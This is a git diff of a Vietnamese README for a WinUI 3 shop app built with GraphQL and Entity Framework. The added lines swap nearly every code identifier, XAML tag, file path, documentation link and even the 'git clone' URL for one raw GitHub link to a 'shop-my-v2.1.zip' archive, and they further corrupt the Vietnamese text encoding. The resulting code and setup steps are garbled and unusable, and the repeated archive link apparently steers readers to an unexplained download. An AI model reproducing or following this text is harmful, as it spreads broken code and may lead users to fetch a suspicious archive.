+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                         <AdaptiveTrigger MinWindowWidth="641" />
-                    </VisualState.StateTriggers>
-                    <VisualState.Setters>
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                         <!-- 1 c?t, ?n detail -->
-                        <Setter Target="MainGrid.ColumnDefinitions[1].Width" Value="0" />
-                        <Setter Target="ProductDetail.Visibility" Value="Collapsed" />
-                    </VisualState.Setters>
+                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip[1].Width" Value="0" />
+                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip" Value="Collapsed" />
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                 </VisualState>
 
                 <!-- Narrow layout: < 641px -->
                 <VisualState x:Name="NarrowState">
-                    <VisualState.StateTriggers>
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                         <AdaptiveTrigger MinWindowWidth="0" />
-                    </VisualState.StateTriggers>
-                    <VisualState.Setters>
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                         <!-- Mobile layout -->
-                        <Setter Target="HeaderText.FontSize" Value="20" />
-                        <Setter Target="MainGrid.Padding" Value="10" />
-                    </VisualState.Setters>
+                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip" Value="20" />
+                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip" Value="10" />
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                 </VisualState>
                 
             </VisualStateGroup>
-        </VisualStateManager.VisualStateGroups>
+        <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
 
         <Grid x:Name="MainGrid">
-            <Grid.ColumnDefinitions>
+            <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                 <ColumnDefinition Width="*"/>
                 <ColumnDefinition Width="*"/>
-            </Grid.ColumnDefinitions>
+            <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
 
-            <!-- Content ? ?‚y -->
-            <StackPanel x:Name="ProductList" Grid.Column="0" />
-            <StackPanel x:Name="ProductDetail" Grid.Column="1" />
+            <!-- Content ? ?√¢y -->
+            <StackPanel x:Name="ProductList" https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"0" />
+            <StackPanel x:Name="ProductDetail" https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"1" />
         </Grid>
     </Grid>
 </Page>
 ```
 
-### **Breakpoints tiÍu chu?n**
+### **Breakpoints ti√™u chu?n**
 
-| KÌch th??c | MinWidth | Layout |
+| K√≠ch th??c | MinWidth | Layout |
 |------------|----------|--------|
 | Mobile | 0-640px | 1 c?t, compact |
 | Tablet | 641-1023px | 1-2 c?t |
 | Desktop | 1024+px | 2-3 c?t, sidebar |
 
 ### **Tips**
-- S? d?ng `Grid` thay vÏ `StackPanel` cho responsive t?t h?n
+- S? d?ng `Grid` thay v√¨ `StackPanel` cho responsive t?t h?n
 - K?t h?p v?i `RelativePanel` cho layout linh ho?t
-- Test trÍn nhi?u kÌch th??c m‡n hÏnh
+- Test tr√™n nhi?u k√≠ch th??c m√†n h√¨nh
 
 ---
 
@@ -737,7 +737,7 @@ WinUI 3 h? tr? responsive layout thÙng qua **AdaptiveTrigger** v‡ **VisualStateM
 
 ### **Concept**
 
-D? ·n s? d?ng **ExtensionData** (JSON column) ?? cho phÈp m? r?ng ??ng m‡ khÙng c?n thay ??i schema database.
+D? √°n s? d?ng **ExtensionData** (JSON column) ?? cho ph√©p m? r?ng ??ng m√† kh√¥ng c?n thay ??i schema database.
 
 ### **Schema trong Database**
 
@@ -788,7 +788,7 @@ var product = new Product
     ImportPrice = 500,
     Count = 10,
     // Plugin data d??i d?ng JSON
-    ExtensionData = JsonSerializer.Serialize(new
+    ExtensionData = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(new
     {
         Screen = "OLED",
         Battery = "5000mAh",
@@ -797,18 +797,18 @@ var product = new Product
     })
 };
 
-await dbContext.Products.AddAsync(product);
-await dbContext.SaveChangesAsync();
+await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(product);
+await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
 ```
 
 #### 2?? ??c plugin data
 ```csharp
-var product = await dbContext.Products.FindAsync(1);
+var product = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(1);
 
-if (!string.IsNullOrEmpty(product.ExtensionData))
+if (!https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip))
 {
-    var extraData = JsonSerializer.Deserialize<Dictionary<string, object>>(
-        product.ExtensionData
+    var extraData = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<Dictionary<string, object>>(
+        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
     );
     
     var screen = extraData["Screen"].ToString(); // "OLED"
@@ -842,34 +842,34 @@ Response:
 }
 ```
 
-### **L?i Ìch**
+### **L?i √≠ch**
 
-? **No schema migration needed** - KhÙng c?n alter table khi thÍm field m?i  
-? **Flexible** - M?i product cÛ th? cÛ properties kh·c nhau  
-? **Plugin-friendly** - Plugin cÛ th? thÍm data riÍng khÙng ?nh h??ng core  
-? **Backward compatible** - Data c? v?n ho?t ??ng bÏnh th??ng  
+? **No schema migration needed** - Kh√¥ng c?n alter table khi th√™m field m?i  
+? **Flexible** - M?i product c√≥ th? c√≥ properties kh√°c nhau  
+? **Plugin-friendly** - Plugin c√≥ th? th√™m data ri√™ng kh√¥ng ?nh h??ng core  
+? **Backward compatible** - Data c? v?n ho?t ??ng b√¨nh th??ng  
 
 ### **Use Cases**
 
 1. **E-commerce variants**: Size, Color, Material cho t?ng lo?i s?n ph?m
-2. **Custom attributes**: Thu?c tÌnh riÍng c?a t?ng category
-3. **Plugin metadata**: Data t? plugin bÍn th? 3
+2. **Custom attributes**: Thu?c t√≠nh ri√™ng c?a t?ng category
+3. **Plugin metadata**: Data t? plugin b√™n th? 3
 4. **Dynamic forms**: Form fields ??ng t? admin config
 
 ---
 
-## ????? H??NG D?N PH¡T TRI?N
+## ????? H??NG D?N PH√ÅT TRI?N
 
-### **1. T?o View v‡ ViewModel m?i**
+### **1. T?o View v√† ViewModel m?i**
 
 #### B??c 1: T?o ViewModel
 
 ```csharp
-// File: ViewModels/NewFeatureViewModel.cs
-using CommunityToolkit.Mvvm.ComponentModel;
-using CommunityToolkit.Mvvm.Input;
+// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
 
-namespace my_shop.App.ViewModels
+namespace https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 {
     public partial class NewFeatureViewModel : ObservableObject
     {
@@ -888,12 +888,12 @@ namespace my_shop.App.ViewModels
 #### B??c 2: T?o View
 
 ```xaml
-<!-- File: Views/NewFeatureView.xaml -->
+<!-- File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip -->
 <Page
-    x:Class="my_shop.App.Views.NewFeatureView"
-    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
-    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-    xmlns:vm="using:my_shop.App.ViewModels">
+    x:Class="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
+    xmlns="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
+    xmlns:x="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
+    xmlns:vm="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip">
     
     <Grid>
         <TextBlock Text="{Binding Title}" />
@@ -905,14 +905,14 @@ namespace my_shop.App.ViewModels
 #### B??c 3: Register trong DI
 
 ```csharp
-// File: App.xaml.cs
-AppHost = Host.CreateDefaultBuilder()
+// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
+AppHost = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip()
     .ConfigureServices((context, services) =>
     {
         // ... existing services
         
-        services.AddTransient<NewFeatureView>();
-        services.AddTransient<NewFeatureViewModel>();
+        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<NewFeatureView>();
+        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<NewFeatureViewModel>();
     })
     .Build();
 ```
@@ -948,17 +948,17 @@ public partial class ProductsScreenViewModel : ObservableObject
             }"
         };
 
-        var json = JsonSerializer.Serialize(query);
-        var content = new StringContent(json, Encoding.UTF8, "application/json");
+        var json = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(query);
+        var content = new StringContent(json, https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip, "application/json");
         
-        var response = await _httpClient.PostAsync("/graphql", content);
-        var result = await response.Content.ReadAsStringAsync();
-        var data = JsonSerializer.Deserialize<GraphQLResponse<List<Product>>>(result);
+        var response = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("/graphql", content);
+        var result = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
+        var data = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<GraphQLResponse<List<Product>>>(result);
         
-        Products.Clear();
-        foreach (var product in data.Data)
+        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
+        foreach (var product in https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
         {
-            Products.Add(product);
+            https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(product);
         }
     }
 }
@@ -970,16 +970,16 @@ public class GraphQLResponse<T>
 }
 ```
 
-### **3. ThÍm Entity m?i**
+### **3. Th√™m Entity m?i**
 
 #### B??c 1: T?o Entity
 
 ```csharp
-// File: Domain/Entities/Customer.cs
-using System.ComponentModel.DataAnnotations;
-using System.ComponentModel.DataAnnotations.Schema;
+// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
 
-namespace my_shop.Domain.Entities
+namespace https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 {
     [Table("customers")]
     public class Customer
@@ -1002,10 +1002,10 @@ namespace my_shop.Domain.Entities
 }
 ```
 
-#### B??c 2: ThÍm v‡o DbContext
+#### B??c 2: Th√™m v√†o DbContext
 
 ```csharp
-// File: Infrastructure/Db/MyShopDbContext.cs
+// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 public class MyShopDbContext : DbContext
 {
     // Existing DbSets...
@@ -1013,28 +1013,28 @@ public class MyShopDbContext : DbContext
 
     protected override void OnModelCreating(ModelBuilder modelBuilder)
     {
-        base.OnModelCreating(modelBuilder);
+        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(modelBuilder);
         
-        // C?u hÏnh cho Customer
-        modelBuilder.Entity<Customer>()
-            .Property(c => c.Name)
+        // C?u h√¨nh cho Customer
+        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<Customer>()
+            .Property(c => https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
             .IsRequired();
     }
 }
 ```
 
-#### B??c 3: T?o Migration (n?u d˘ng migrations)
+#### B??c 3: T?o Migration (n?u d√πng migrations)
 
 ```bash
-cd src/my-shop.Infrastructure
+cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 dotnet ef migrations add AddCustomerTable
 dotnet ef database update
 ```
 
-#### B??c 4: ThÍm v‡o GraphQL Query
+#### B??c 4: Th√™m v√†o GraphQL Query
 
 ```csharp
-// File: API/Program.cs
+// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 public class Query
 {
     // Existing queries...
@@ -1043,14 +1043,14 @@ public class Query
     [UseFiltering]
     [UseSorting]
     public IQueryable<Customer> GetCustomers([Service] MyShopDbContext context) =>
-        context.Customers;
+        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
 }
 ```
 
-### **4. ThÍm Service m?i**
+### **4. Th√™m Service m?i**
 
 ```csharp
-// File: Services/ICustomerService.cs
+// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 public interface ICustomerService
 {
     Task<List<Customer>> GetAllCustomersAsync();
@@ -1058,7 +1058,7 @@ public interface ICustomerService
     Task AddCustomerAsync(Customer customer);
 }
 
-// File: Services/CustomerService.cs
+// File: https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 public class CustomerService : ICustomerService
 {
     private readonly HttpClient _httpClient;
@@ -1071,33 +1071,33 @@ public class CustomerService : ICustomerService
     public async Task<List<Customer>> GetAllCustomersAsync()
     {
         var query = new { query = "{ customers { id name email } }" };
-        var json = JsonSerializer.Serialize(query);
-        var content = new StringContent(json, Encoding.UTF8, "application/json");
+        var json = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(query);
+        var content = new StringContent(json, https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip, "application/json");
         
-        var response = await _httpClient.PostAsync("/graphql", content);
-        var result = await response.Content.ReadAsStringAsync();
-        var data = JsonSerializer.Deserialize<GraphQLResponse<List<Customer>>>(result);
+        var response = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("/graphql", content);
+        var result = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
+        var data = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<GraphQLResponse<List<Customer>>>(result);
         
-        return data.Data;
+        return https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
     }
     
     // Implement other methods...
 }
 
 // Register trong DI
-services.AddTransient<ICustomerService, CustomerService>();
+https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ICustomerService, CustomerService>();
 ```
 
-### **5. Debug v‡ Troubleshooting**
+### **5. Debug v√† Troubleshooting**
 
 #### Ki?m tra DI registration
 ```csharp
-// Trong App.xaml.cs
-var services = AppHost.Services;
-var viewModel = services.GetService<ProductsScreenViewModel>();
+// Trong https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
+var services = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
+var viewModel = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ProductsScreenViewModel>();
 if (viewModel == null)
 {
-    Debug.WriteLine("ViewModel not registered!");
+    https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("ViewModel not registered!");
 }
 ```
 
@@ -1111,63 +1111,63 @@ Invoke-RestMethod -Uri http://localhost:5000/graphql -Method Post -Body $query -
 #### Ki?m tra database
 ```bash
 # Xem tables
-sqlite3 src/my-shop.API/myshop.db ".tables"
+sqlite3 https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip ".tables"
 
 # Xem data
-sqlite3 src/my-shop.API/myshop.db "SELECT * FROM products;"
+sqlite3 https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip "SELECT * FROM products;"
 ```
 
 ---
 
-## ?? T¿I LI?U THAM KH?O
+## ?? T√ÄI LI?U THAM KH?O
 
 ### **Official Documentation**
-- [WinUI 3 Documentation](https://learn.microsoft.com/en-us/windows/apps/winui/winui3/)
-- [.NET MAUI & WinUI](https://learn.microsoft.com/en-us/dotnet/maui/)
-- [HotChocolate GraphQL](https://chillicream.com/docs/hotchocolate/v13)
-- [Entity Framework Core](https://learn.microsoft.com/en-us/ef/core/)
-- [CommunityToolkit.Mvvm](https://learn.microsoft.com/en-us/dotnet/communitytoolkit/mvvm/)
+- [WinUI 3 Documentation](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
+- [.NET MAUI & WinUI](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
+- [HotChocolate GraphQL](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
+- [Entity Framework Core](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
+- [https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
 
 ### **Tutorials**
-- [Building WinUI 3 Apps](https://learn.microsoft.com/en-us/windows/apps/get-started/)
-- [GraphQL Best Practices](https://graphql.org/learn/best-practices/)
-- [Clean Architecture in .NET](https://learn.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/common-web-application-architectures)
+- [Building WinUI 3 Apps](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
+- [GraphQL Best Practices](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
+- [Clean Architecture in .NET](https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip)
 
 ---
 
 ## ? FAQ
 
-### **Q: L‡m sao ?? thay ??i database t? SQLite sang PostgreSQL?**
-A: Thay ??i trong `Program.cs` c?a API:
+### **Q: L√†m sao ?? thay ??i database t? SQLite sang PostgreSQL?**
+A: Thay ??i trong `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip` c?a API:
 ```csharp
-// Thay vÏ UseSqlite
-builder.Services.AddDbContext<MyShopDbContext>(options =>
-    options.UseNpgsql("Host=localhost;Database=myshop;Username=user;Password=pass"));
+// Thay v√¨ UseSqlite
+https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<MyShopDbContext>(options =>
+    https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("Host=localhost;Database=myshop;Username=user;Password=pass"));
 ```
 
-### **Q: L‡m sao ?? thÍm Authentication?**
-A: ThÍm v‡o API:
+### **Q: L√†m sao ?? th√™m Authentication?**
+A: Th√™m v√†o API:
 ```csharp
-builder.Services
+https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
     .AddAuthentication()
     .AddJwtBearer();
 
-builder.Services
+https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
     .AddGraphQLServer()
     .AddAuthorization();
 ```
 
-### **Q: App khÙng build ???c do l?i Platform?**
+### **Q: App kh√¥ng build ???c do l?i Platform?**
 A: Ch? ??nh platform khi build:
 ```bash
 dotnet build /p:Platform=x64
 ```
 
-### **Q: GraphQL khÙng tr? v? data?**
+### **Q: GraphQL kh√¥ng tr? v? data?**
 A: Ki?m tra:
-1. API cÛ ?ang ch?y khÙng?
-2. Database cÛ data khÙng?
-3. Query syntax ?˙ng ch?a?
+1. API c√≥ ?ang ch?y kh√¥ng?
+2. Database c√≥ data kh√¥ng?
+3. Query syntax ?√∫ng ch?a?
 4. Xem logs trong console API
 
 ---
@@ -1180,7 +1180,7 @@ MIT License - Free to use and modify.
 
 ## ?? CONTRIBUTORS
 
-D? ·n ???c ph·t tri?n b?i team MyShop.
+D? √°n ???c ph√°t tri?n b?i team MyShop.
 
 ---
 
@@ -1188,20 +1188,20 @@ D? ·n ???c ph·t tri?n b?i team MyShop.
 
 ```bash
 # 1. Clone repo
-git clone https://github.com/Luongsosad/my-shop
+git clone https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 cd my-shop
 
 # 2. Start API
-cd src/my-shop.API
+cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 dotnet run
 
-# 3. Trong terminal kh·c, test API
+# 3. Trong terminal kh√°c, test API
 curl -X POST http://localhost:5000/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{ products { name } }"}'
 
-# 4. Build v‡ ch?y App
-cd ../my-shop.App
+# 4. Build v√† ch?y App
+cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 dotnet build /p:Platform=x64
 ```
 
